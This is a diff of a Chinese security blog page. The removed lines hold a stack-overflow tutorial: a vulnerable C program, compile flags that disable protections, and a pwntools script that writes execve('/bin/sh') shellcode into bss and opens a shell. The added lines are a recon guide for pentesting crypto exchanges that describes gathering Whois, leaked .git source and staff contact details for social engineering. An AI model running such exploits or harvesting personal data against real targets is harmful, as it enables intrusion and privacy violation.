@@ -4,14 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="栈溢出（二）, 妖窝">
-    <meta name="description" content="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。
-　　源程序代码如下：     
-#include&amp;lt;stdio.h&gt;
-char str[100];
-void vul()
-{
- ">
+    <meta name="keywords" content="交易所安全测试之信息收集, 妖窝">
+    <meta name="description" content="交易所安全测试–信息收集一、概述　　对于所有安全相关的测试来说，信息收集都是非常重要且必要的第一步，有时一次非常全面完善的信息收集甚至会占到一次测试总工程量的的70%到80%，能为后续的工作节省大量精力，提供便利，交易所的测试也是一样，第一">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +13,7 @@ void vul()
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>栈溢出（二） | 妖窝</title>
+    <title>交易所安全测试之信息收集 | 妖窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -263,13 +257,13 @@ void vul()
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        栈溢出（二）
+                        交易所安全测试之信息收集
                     </div>
                 </div>
             </div>
@@ -380,8 +374,12 @@ void vul()
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/栈溢出/" target="_blank">
-                                <span class="chip bg-color">栈溢出</span>
+                            <a href="/tags/区块链安全/" target="_blank">
+                                <span class="chip bg-color">区块链安全</span>
+                            </a>
+                        
+                            <a href="/tags/交易所安全测试/" target="_blank">
+                                <span class="chip bg-color">交易所安全测试</span>
                             </a>
                         
                     </div>
@@ -392,8 +390,8 @@ void vul()
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                二进制安全
+                            <a href="/categories/区块链安全/" class="post-category" target="_blank">
+                                区块链安全
                             </a>
                         
                     </div>
@@ -404,21 +402,21 @@ void vul()
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-03-27
+                    2019-11-06
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        402
+                        1.7k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        5 分
                     </div>
                     
                 
@@ -429,51 +427,48 @@ void vul()
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"><a href="#这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。" class="headerlink" title="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"></a>这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。</h5><a id="more"></a>
-<p>　　源程序代码如下：     </p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>　　自己填塞恶意代码，容易“跑”，我们需要一块稳定的，持续可用的代码段来供我们使用。这时候首先想到的是<code>bss</code>段，因为<code>bss</code>段通常用来存放程序中未初始化的全局变量，且可读可写。变量一般分为全局变量和局部变量，局部变量的存活时间较短，函数执行完就自动释放了，全局变量则不同，可以被程序内所有的对象或函数引用，相对来说更加稳定，比较适合存放一段恶意代码。<br>　　<code>bss</code>段可读可写不可执行，因此如果我们想进行实验，需要关掉栈保护和数据执行保护，使得<code>bss</code>段的代码变得可以执行。编译命令如下：    </p>
-<pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -z execstack -o xxxx xxxx.c
-</code></pre>
-<p>　　<code>-fno-stack-protector</code>用于关掉栈保护，<code>-z execstack</code>用于关掉数据可执行保护（DEP）。攻击脚本代码如下：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)       #远程</span>
-read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
-
-
-payload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-
-shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
+                <h1 id="交易所安全测试–信息收集"><a href="#交易所安全测试–信息收集" class="headerlink" title="交易所安全测试–信息收集"></a>交易所安全测试–信息收集</h1><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>　　对于所有安全相关的测试来说，信息收集都是非常重要且必要的第一步，有时一次非常全面完善的信息收集甚至会占到一次测试总工程量的的70%到80%，能为后续的工作节省大量精力，提供便利，交易所的测试也是一样，第一步的信息收集至关重要。以下是一些案例，见微知著，通过它们就可以了解到在这样的测试中交易所有什么样的信息可供测试方收集利用。其中几点将会被单独加以说明，以供参考。</p>
+<h2 id="二、测试列表"><a href="#二、测试列表" class="headerlink" title="二、测试列表"></a>二、测试列表</h2><blockquote>
+<p>信息收集</p>
+<ul>
+<li>域名 Whois及备案信息采集</li>
+<li>服务器真实 IP 发现</li>
+<li>服务器指纹识别子域探测</li>
+<li>邮件服务探测</li>
+<li>证书信息采集</li>
+<li>Web服务组件指纹采集</li>
+<li>Web网站目录探测</li>
+<li>API接口信息泄露</li>
+<li>端口服务组件指纹采集</li>
+<li>旁服信息采集</li>
+<li>C 段服务采集</li>
+<li>GitHub 源码泄露发现</li>
+<li>DNS记录分析搜索引擎公开信息采集（google，shodan，zoomeye）</li>
+<li>企业信息采集（员工信息，组织框架，企业法人，企业综合信息）</li>
+<li>敏感文件发现</li>
+</ul>
+</blockquote>
+<h2 id="三、案例分析"><a href="#三、案例分析" class="headerlink" title="三、案例分析"></a>三、案例分析</h2><p>　　关于信息收集，众说纷纭，甚至也有言论称信息收集是测试中用处最不明显的一环，诚然并不是所有信息都是有效且可被利用的，但其中一些确实可以在山穷水复的时候柳暗花明，以致再次找到新的突破口。</p>
+<p>　　以下几个案例就将揭示，在测试中，信息收集这一阶段为整个测试过程贡献了怎样的力量。</p>
+<h3 id="API接口信息泄露"><a href="#API接口信息泄露" class="headerlink" title="API接口信息泄露"></a>API接口信息泄露</h3><p>　　API的使用频率越来越高，占比也越来越大，所谓“能力越大责任越大”，安全的API使用固然可以带来极大的便利，但是API的安全一旦出了问题，带来的后果将是毁灭性的。在测试的第一步，信息收集的领域，关于API我们首先能接触到的，就是API具体使用参数等详情的信息保密状态了。</p>
+<p>　　零时安全实验室研究员对某交易所进行安全测试时，发现该交易所的代码是外包公司所编写。在而后的信息收集过程中，零时安全实验室在google上找到了外包公司编写代码时留下的，托管在某团队协作平台上的API文档。文档中详细地说明了使用API时用到的各种参数及其类型和具体的含义，用处，并且在样例中遗留下了一些测试时使用的具体参数，对后续的测试提供了很大帮助。</p>
+<p><img src="/2019/11/06/guan-yu-xin-xi-shou-ji/api泄露.png" alt="API接口信息"></p>
+<h3 id="域名-Whois及备案信息采集"><a href="#域名-Whois及备案信息采集" class="headerlink" title="域名 Whois及备案信息采集"></a>域名 Whois及备案信息采集</h3><p>　　虽然现在已经有交易所注册域名时会使用域名注册商提供的服务，没有在Whois等域名信息备案网站上泄露公司或相关人员信息，但仍然有一些交易所会“本尊”亲自注册域名，这时利用Whois或其它的工具就可以找到该交易所域名的注册公司或相关人员的详细信息。而这些不起眼的信息对于后续的测试手段（如密码猜解，社会工程学攻击等）都会有很大帮助，可以极大提高其成功率。</p>
+<p>　　零时安全实验室在对另一家交易所进行安全测试时，根据该交易所在Whois上留下的门户网站域名备案信息，找到了其注册公司，而后又根据注册公司信息找到了该公司经理（亦为股东之一）的手机号，QQ号，微信号和注册人邮箱的一部分。虽然零时安全实验室并没有开展后续的社会工程学攻击等测试手段，但在真正需要使用特殊攻击手法时，这些信息无疑会极大提高成功率，能让测试方更从容，更轻松地撕开突破口，完成测试。</p>
+<p><img src="/2019/11/06/guan-yu-xin-xi-shou-ji/D1.png" alt="注册公司及人员信息"></p>
+<p><img src="/2019/11/06/guan-yu-xin-xi-shou-ji/D2.png" alt="注册公司及人员信息"></p>
+<h3 id="GitHub-源码泄露发现"><a href="#GitHub-源码泄露发现" class="headerlink" title="GitHub 源码泄露发现"></a>GitHub 源码泄露发现</h3><p>　　部分开发人员在编写代码时会习惯性地将源码上传到github等代码托管平台上，而这些源码，则是每个测试方都日思夜想要拿到的东西。毕竟，如果拿到了源码，就可以对其进行审计工作，直接找寻编写源码时留下的漏洞和疏忽。这会使得整个测试过程更加容易，减少了很大工作量。同时直接审计源码可以找到的问题和漏洞也会更加全面，具有针对性。</p>
+<p>　　同样地，对于交易所所使用的源码的找寻同样是信息收集中重要的一环，如下是在一家交易所网站上找到的/.git源码文件。零时安全实验室通过审计源码，将审计过程中找到的，存放于注释中的敏感信息和其他审计所得与已发现的漏洞相互验证，成功地在测试中获得了该服务器的控制权，完成了这次测试。</p>
+<p><img src="/2019/11/06/guan-yu-xin-xi-shou-ji/源码.png" alt="交易所.git源码泄露"></p>
+<h3 id="敏感文件发现"><a href="#敏感文件发现" class="headerlink" title="敏感文件发现"></a>敏感文件发现</h3><p>　　敏感文件的种类很多，其中最经典也往往在测试过程中最能发挥作用的就是robots.txt，sitemap.xml等文件，一些敏感文件甚至可以成为测试的突破口。</p>
+<p>　　以下仅以两家交易所网站中robots.txt的部分信息为例。对于测试方来说，获得了这些信息就可以轻松地找到交易所网站中确实存在却不允许被轻易访问的敏感页面。如果这些页面存在某种规律或特点，甚至可以找到其使用的组件，CMS等其他信息，进而更有针对性地进行测试工作。</p>
+<p>　　而在针对该交易所的测试过程中，零时安全团队也确实使用了其中的信息，配合其他手法成功攻入了该交易所后台。</p>
+<p>　　<img src="/2019/11/06/guan-yu-xin-xi-shou-ji/h1.png" alt="敏感文件发现"></p>
+<p>　　<img src="/2019/11/06/guan-yu-xin-xi-shou-ji/h2.png" alt="敏感文件发现"></p>
+<p>　　<strong>以上就是本期文章的全部内容。</strong></p>
+<p>　　<strong>信息收集对于测试方来说是测试的第一步，是测试的基础，那么对于交易所方来说，隐藏信息就是保障自身安全的第一步，做好自身信息的隐藏，就能将绝大多数的攻击扼杀在襁褓之中。</strong></p>
+<p>　　<strong>下一篇文章将会讲述有关于社会工程学的更高级的情报收集，敬请关注。</strong></p>
+<p><em>最终成品见零时科技github: <a href="https://github.com/NoneAge" target="_blank" rel="noopener">https://github.com/NoneAge</a></em><br><em>本文详见: <a href="https://github.com/NoneAge/BlockchainSecurityTutorial/blob/master/1.CryptocurrenciesExchangePentestTutorial/0x01%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.pdf" target="_blank" rel="noopener">https://github.com/NoneAge/BlockchainSecurityTutorial/blob/master/1.CryptocurrenciesExchangePentestTutorial/0x01%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.pdf</a></em></p>
 
             </div>
             <hr>
@@ -497,7 +492,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </span>
                     <a href="http://windq08.github.io" class="b-link-green">妖窝</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/03/27/zhan-yi-chu-er/" class="b-link-green">栈溢出（二）</a>
+                    <a href="/2019/11/06/guan-yu-xin-xi-shou-ji/" class="b-link-green">交易所安全测试之信息收集</a>
                 </p>
             </div>
         </div>
@@ -520,41 +515,46 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/04/13/zhan-yi-chu-san/">
+                <a href="/2019/11/06/guan-yu-xin-xi-shou-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="栈溢出（三）">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="交易所安全测试之信息收集">
                         
-                        <span class="card-title">栈溢出（三）</span>
+                        <span class="card-title">交易所安全测试之信息收集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">        
-一、了解一下libc　　libc动态链接库中的函数被广泛使用，所以有大概率可以在内存中找到libc动态库。该库内包含了一些系统级的函数，比如system()，所以可以尝试用这些系统级的函数取得控制权。再比如，这样的参数有可</div>
+                    <div class="summary">交易所安全测试–信息收集一、概述　　对于所有安全相关的测试来说，信息收集都是非常重要且必要的第一步，有时一次非常全面完善的信息收集甚至会占到一次测试总工程量的的70%到80%，能为后续的工作节省大量精力，提供便利，交易所的测试也是一样，第一</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
+                            <a href="/categories/区块链安全/" class="post-category" target="_blank">
+                                    区块链安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/区块链安全/" target="_blank">
+                        <span class="chip bg-color">区块链安全</span>
+                    </a>
+                    
+                    <a href="/tags/交易所安全测试/" target="_blank">
+                        <span class="chip bg-color">交易所安全测试</span>
                     </a>
                     
                 </div>
@@ -568,28 +568,28 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/03/25/zhan-yi-chu-yi/">
+                <a href="/2019/09/26/app-ce-shi-de-yi-xie-chang-yong-ce-shi-xiang-mu-fen-xiang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="栈溢出（一）">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="App测试的一些常用测试点分享">
                         
-                        <span class="card-title">栈溢出（一）</span>
+                        <span class="card-title">App测试的一些常用测试点分享</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。        
-一、栈溢出的概念　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都</div>
+                    <div class="summary">划重点！！！本着早期“黑客要有共享精神”和现在“安全人员技术共享”的原则，将知识分享给大家，一定不要干坏事哟！　
+</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-25
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/二进制安全/" class="post-category" target="_blank">
-                                    二进制安全
+                            <a href="/categories/Web安全/" class="post-category" target="_blank">
+                                    Web安全
                                 </a>
                             
                             
@@ -599,8 +599,12 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/栈溢出/" target="_blank">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/App测试/" target="_blank">
+                        <span class="chip bg-color">App测试</span>
+                    </a>
+                    
+                    <a href="/tags/渗透测试/" target="_blank">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
